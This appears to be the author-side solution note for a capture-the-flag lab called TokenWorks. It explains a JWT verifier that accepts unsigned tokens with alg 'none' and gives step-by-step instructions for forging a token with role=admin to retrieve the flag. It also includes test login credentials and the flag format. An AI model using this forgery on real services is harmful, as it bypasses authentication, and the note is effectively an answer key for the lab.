# JWT / NoneAlg — TokenWorks

Bug: the `GET /flag/jwt` verifier trusts the token **header's alg claim** —
when `alg` is `none` it accepts the payload **without any signature check**
(the library default of pinning algorithms was overridden).

Why exploitable: the gate needs the impossible-issued claim combo
`sub=<innocent>` + `role=admin`; an unsigned token carrying exactly that combo
passes "verification".

Intended path:
1. `POST /login {"username":"0xnhsec","password":"vlh-tester-01"}` → HS256 token.
2. `GET /api/directory` → find the innocent account (`usr_…`, role `innocent`).
3. Forge `base64url({"alg":"none","typ":"JWT"}) . base64url({"sub":"usr_…","role":"admin"}) .` (empty signature).
4. `GET /flag/jwt` with `Authorization: Bearer <forged>` →
   `DSLTV{JWT-NoneAlg-<n>}` (server decodes and checks the claim pair).

Flag format: `DSLTV{JWT-NoneAlg-<digits>}` — regenerated at every boot.
